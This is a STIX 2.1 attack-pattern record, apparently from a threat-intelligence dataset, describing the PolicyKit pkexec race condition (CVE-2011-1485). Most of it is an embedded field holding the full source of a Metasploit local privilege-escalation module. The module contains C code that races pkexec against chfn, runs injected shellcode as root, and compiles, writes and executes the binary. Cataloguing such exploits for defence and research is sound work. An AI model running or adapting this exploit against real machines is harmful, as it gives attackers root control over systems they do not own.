{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--71d7c3bb-8c85-421c-a1e9-90c30d5f490c",
    "created": "2024-08-14T16:58:57.23308Z",
    "modified": "2024-08-14T16:58:57.233085Z",
    "name": "Linux PolicyKit Race Condition Privilege Escalation",
    "description": "( A race condition flaw was found in the PolicyKit pkexec utility and polkitd daemon. A local user could use this flaw to appear as a privileged user to pkexec, allowing them to execute arbitrary commands as root by running those commands with pkexec.  Those vulnerable include RHEL6 prior to polkit-0.96-2.el6_0.1 and Ubuntu libpolkit-backend-1 prior to 0.96-2ubuntu1.1 (10.10) 0.96-2ubuntu0.1 (10.04 LTS) and 0.94-1ubuntu1.1 (9.10) ) 'License'       => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/pkexec.rb",
            "external_id": "pkexec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-1485"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n#\n# Project\n#\n\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = GreatRanking\n\n  include Msf::Exploit::EXE\n  include Msf::Post::File\n\n  include Msf::Exploit::Local::Linux\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'          => 'Linux PolicyKit Race Condition Privilege Escalation',\n      'Description'   => %q(\n        A race condition flaw was found in the PolicyKit pkexec utility and polkitd\n        daemon. A local user could use this flaw to appear as a privileged user to\n        pkexec, allowing them to execute arbitrary commands as root by running\n        those commands with pkexec.\n\n        Those vulnerable include RHEL6 prior to polkit-0.96-2.el6_0.1 and Ubuntu\n        libpolkit-backend-1 prior to 0.96-2ubuntu1.1 (10.10) 0.96-2ubuntu0.1\n        (10.04 LTS) and 0.94-1ubuntu1.1 (9.10)\n      ),\n      'License'       => MSF_LICENSE,\n      'Author'        =>\n      [\n        'xi4oyu',                           # exploit\n        '0a29406d9794e4f9b30b3c5d6702c708'  # metasploit module\n      ],\n      'Platform'       => [ 'linux'],\n      'Arch'           => [ ARCH_X86, ARCH_X64 ],\n      'SessionTypes'   => [ 'shell', 'meterpreter' ],\n      'Targets'       =>\n      [\n        [ 'Linux x86',       { 'Arch' => ARCH_X86 } ],\n        [ 'Linux x64',       { 'Arch' => ARCH_X64 } ]\n      ],\n      'DefaultTarget' => 0,\n      'References'    =>\n      [\n        [ 'CVE', '2011-1485' ],\n        [ 'EDB', '17942' ],\n        [ 'OSVDB', '72261' ]\n      ],\n      'DisclosureDate' => '2011-04-01'\n    ))\n    register_options([\n      OptInt.new(\"Count\", [true, \"Number of attempts to win the race condition\", 500 ]),\n      OptInt.new(\"ListenerTimeout\", [true, \"Number of seconds to wait for the exploit\", 60]),\n      OptBool.new(\"DEBUG_EXPLOIT\", [ true, \"Make the exploit executable be verbose about what it's doing\", false ])\n    ])\n    register_advanced_options [\n      OptString.new(\"WritableDir\", [ true, \"A directory where we can write files (must not be mounted noexec)\", \"/tmp\" ])\n    ]\n  end\n\n  def executable_path\n    @executable_path ||= datastore[\"WritableDir\"] + \"/\" + rand_text_alphanumeric(8)\n    @executable_path\n  end\n\n  def check\n    # version can be nil\n    version = cmd_exec('pkexec --version').split.last\n\n    # version can be a string, so we check it\n    if version.nil? || !Rex::Version.correct?(version)\n      vprint_error('pkexec not found or version incorrect')\n      return CheckCode::Unknown\n    end\n\n    if Rex::Version.new(version) <= Rex::Version.new('0.101')\n      vprint_good(\"pkexec #{version} found\")\n      return CheckCode::Appears\n    end\n\n    CheckCode::Detected\n  end\n\n  def exploit\n    main = %q^\n/*\n* Exploit Title: pkexec Race condition (CVE-2011-1485) exploit\n* Author: xi4oyu\n* Tested on: rhel 6\n* CVE : 2011-1485\n* Linux pkexec exploit by xi4oyu , thx dm@0x557.org * Have fun~\n* U can reach us  @ http://www.wooyun.org :)\n* 0a2940: some changes\n*/\n/*\n#include <stdio.h>\n#include <limits.h>\n#include <time.h>\n#include <unistd.h>\n#include <termios.h>\n#include <sys/stat.h>\n#include <errno.h>\n#include <poll.h>\n#include <sys/types.h>\n#include <stdlib.h>\n#include <string.h>\n*/\n\n#define dprintf\n\n#define NULL ((void*)0)\n\n#define MAP_PRIVATE   0x02\n#define MAP_FIXED     0x10\n#define MAP_ANONYMOUS 0x20\n#define MAP_ANON MAP_ANONYMOUS\n#define MAP_FAILED ((void *)-1)\n\n#define PROT_READ  0x1\n#define PROT_WRITE 0x2\n#define PROT_EXEC  0x4\n\n#define O_CREAT 64\n#define O_RDWR 2\n\n#define POLLRDNORM      0x0040\n\ntypedef int __pid_t;\ntypedef int __time_t;\ntypedef\nstruct {\n        long __val[2];\n} __quad_t;\ntypedef __quad_t __dev_t;\ntypedef long __ino_t;\ntypedef unsigned long __mode_t;\ntypedef long __nlink_t;\ntypedef unsigned int __uid_t;\ntypedef unsigned int __gid_t;\ntypedef long long __off_t;\ntypedef long __blksize_t;\ntypedef long long __blkcnt_t;\nstruct _stat_buff {\n    __dev_t st_dev;                     /* Device.  */\n    unsigned short int __pad1;\n    __ino_t st_ino;                     /* File serial number.  */\n    __mode_t st_mode;                   /* File mode.  */\n    __nlink_t st_nlink;                 /* Link count.  */\n    __uid_t st_uid;                     /* User ID of the file's owner. */\n    __gid_t st_gid;                     /* Group ID of the file's group.*/\n    __dev_t st_rdev;                    /* Device number, if device.  */\n    unsigned short int __pad2;\n    __off_t st_size;                    /* Size of file, in bytes.  */\n    __blksize_t st_blksize;             /* Optimal block size for I/O.  */\n    __blkcnt_t st_blocks;               /* Number 512-byte blocks allocated. */\n    __time_t st_atime;                  /* Time of last access.  */\n    unsigned long int st_atimensec;     /* Nscecs of last access.  */\n    __time_t st_mtime;                  /* Time of last modification.  */\n    unsigned long int st_mtimensec;     /* Nsecs of last modification.  */\n    __time_t st_ctime;                  /* Time of last status change.  */\n    unsigned long int st_ctimensec;     /* Nsecs of last status change.  */\n    unsigned long int __unused4;\n    unsigned long int __unused5;\n};\n\nstruct _pollfd {\n    int   fd;         /* file descriptor */\n    short events;     /* requested events */\n    short revents;    /* returned events */\n};\ntypedef unsigned long size_t;\nextern void *mmap(void *__addr, size_t __len, int __prot, int __flags, int __fd, __off_t __offset);\nextern int mprotect(void *__addr, size_t __len, int __prot);\nextern void exit(int __status);\nextern int printf(const char *__format, ...);\nextern __pid_t fork(void);\nextern __time_t time(__time_t *t);\nextern __pid_t getpid(void);\nextern __uid_t geteuid(void);\nextern void srand(unsigned int seed);\nextern int snprintf(char *str, size_t size, const char *format, ...);\nextern int pipe(int pipefd[2]);\nextern int close(int fd);\nextern void write(int fd, const void *buf, size_t count);\nextern int dup2(int oldfd, int newfd);\nextern void perror(const char *__s);\nextern void read(int fd, void *buf, size_t count);\nextern int execve(const char *filename, char *const argv[], char *const envp);\nextern int usleep(int usec);\nextern void *memset(void *s, int c, size_t n);\nextern void *memcpy(void * dst, const void *src, size_t n);\nextern int poll(struct _pollfd *fds, unsigned int nfds, int timeout);\nextern char *strstr(const char *haystack, const char *needle);\nextern int rand(void);\nextern int unlink(const char *__name);\n\nint main(int argc,char *argv[], char ** envp)\n{\n\n    __time_t tim_seed1;\n    __pid_t pid_seed2;\n    int result;\n    struct _stat_buff stat_buff;\n\n    char * chfn_path = \"/usr/bin/chfn\";\n    char * cmd_path = \"\";\n\n    char * pkexec_argv[] = {\n        \"/usr/bin/pkexec\",\n        \"/bin/sh\",\n        \"-c\",\n        cmd_path,\n        NULL\n    };\n    int pipe1[2];\n    int pipe2[2];\n    int pipe3[2];\n    __pid_t pid,pid2 ;\n    char * chfn_argv[] = {\n        \"/usr/bin/chfn\",\n        NULL\n    };\n\n    char buff[8];\n    char read_buff[4096];\n    char real_path[512];\n\n    int count = 0;\n    int flag = 0;\n    unsigned int usleep1 = 0;\n    unsigned int usleep2 = 0;\n\n    tim_seed1 = time(NULL);\n    pid_seed2 = getpid();\n    srand(tim_seed1+pid_seed2);\n\n    if(!geteuid()){\n\n      unlink(cmd_path);\n\n      SHELLCODE\n\n      int shellcode_size = 0;\n      int i;\n      unsigned long (*func)();\n      func = mmap(NULL, 0x1000,\n        PROT_READ | PROT_WRITE | PROT_EXEC,\n        MAP_PRIVATE | MAP_ANONYMOUS,\n        0, 0\n      );\n      mprotect(func, 4096, PROT_READ|PROT_WRITE|PROT_EXEC);\n      dprintf(\"Copying %d bytes of shellcode\\n\", shellcode_size);\n      //for (i = 0; i < shellcode_size; i++) {\n        //(char)func[i] = (char)shellcode[i];\n         memcpy(func,shellcode,shellcode_size);\n      //}\n      dprintf(\"Forking before calling shellcode: 0x%p\\n\", func);\n      if (fork()) {\n        exit(0);\n      }\n      func();\n    }\n\n    if(pipe(pipe1)){\n        perror(\"pipe\");\n        exit(-2);\n    }\n\n    for(count = COUNT; count && !flag; count--){\n        dprintf(\"count %d usleep1 %d usleep2 %d\\n\",count,usleep1,usleep2);\n        pid = fork();\n        if( !pid ){\n            // Parent\n            if( !pipe(pipe2)){\n                if(!pipe(pipe3)){\n                    pid2 = fork();\n                    if(!pid2){\n                        // Parent 2\n                        close(1);\n                        close(2);\n                        close(pipe1[0]);\n                        dup2(pipe1[1],2);\n                        dup2(pipe1[1],1);\n                        close(pipe1[1]);\n                        close(pipe2[0]);\n                        close(pipe3[1]);\n                        write(pipe2[1],\"\\xFF\",1);\n                        read(pipe3[0],&buff,1);\n                        execve(pkexec_argv[0],pkexec_argv,envp);\n                        perror(\"execve pkexec\");\n                        exit(-3);\n                    }\n                    close(0);\n                    close(1);\n                    close(2);\n                    close(pipe2[1]);\n                    close(pipe3[0]);\n                    read(pipe2[0],&buff,1);\n                    write(pipe3[1],\"\\xFF\",1);\n                    usleep(usleep1+usleep2);\n                    execve(chfn_argv[0],chfn_argv,envp);\n                    perror(\"execve setuid\");\n                    exit(1);\n                }\n            }\n            perror(\"pipe3\");\n            exit(1);\n        }\n\n        //Note: This is child, no pipe3 we use poll to monitor pipe1[0]\n        memset(pipe3,0,8);\n\n        struct _pollfd * pollfd = (struct pollfd *)(&pipe3);\n        pollfd->fd = pipe1[0];\n        pollfd->events =  POLLRDNORM;\n\n        if(poll(pollfd,1,1000) < 0){\n            perror(\"poll\");\n            exit(1);\n        }\n\n        if(pollfd->revents & POLLRDNORM ){\n            memset(read_buff,0,4096);\n            read(pipe1[0],read_buff,4095);\n            if( strstr(read_buff,\"does not match\")){\n                usleep1 += 100;\n                usleep2 = rand() % 1000;\n            }else{\n                if(usleep1 > 0){\n                  usleep1 -= 100;\n                }\n            }\n        }\n    }\n    result = 0;\n    unlink(cmd_path);\n    return result;\n}\n\n^\n    main.gsub!(/SHELLCODE/, Rex::Text.to_c(payload.encoded, 64, \"shellcode\"))\n    main.gsub!(/shellcode_size = 0/, \"shellcode_size = #{payload.encoded.length}\")\n    main.gsub!(/cmd_path = \"\"/, \"cmd_path = \\\"#{executable_path}\\\"\")\n    main.gsub!(/COUNT/, datastore[\"Count\"].to_s)\n    main.gsub!(/#define dprintf/, \"#define dprintf printf\") if datastore['DEBUG_EXPLOIT']\n\n    cpu = nil\n    if target['Arch'] == ARCH_X86\n      cpu = Metasm::Ia32.new\n    elsif target['Arch'] == ARCH_X64\n      cpu = Metasm::X86_64.new\n    end\n\n    begin\n      elf = Metasm::ELF.compile_c(cpu, main).encode_string\n    rescue => e\n      print_error \"Metasm Encoding failed: #{$ERROR_INFO}\"\n      elog('Metasm Encoding failed', error: e)\n      return\n    end\n\n    print_status \"Writing exploit executable to #{executable_path} (#{elf.length} bytes)\"\n    rm_f executable_path\n    write_file(executable_path, elf)\n    output = cmd_exec(\"chmod +x #{executable_path}; #{executable_path}\")\n    output.each_line { |line| vprint_status(line.chomp) }\n\n    stime = Time.now.to_f\n    print_status \"Starting the payload handler...\"\n    until session_created? || stime + datastore['ListenerTimeout'] < Time.now.to_f\n      Rex.sleep(1)\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-04-01",
    "x_mitre_platforms": [
        "[ 'linux']"
    ]
}